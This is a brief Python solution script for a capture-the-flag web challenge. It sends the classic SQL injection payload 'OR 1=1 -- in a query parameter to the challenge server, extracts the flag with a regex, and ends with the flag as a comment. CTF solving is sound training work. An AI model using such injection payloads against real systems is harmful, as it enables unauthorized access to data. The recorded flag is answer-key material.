import requests
import re

site = "http://giftlist.challs.olicyber.it/"

r = requests.get(f"{site}/get?user='OR 1=1 -- ").text
match = re.search(r'ITASEC\{[^\}]+\}', str(r))
flag = match.group(0)
print(flag)

#ITASEC{sql_1nj3ct10n_b4by_st3p5}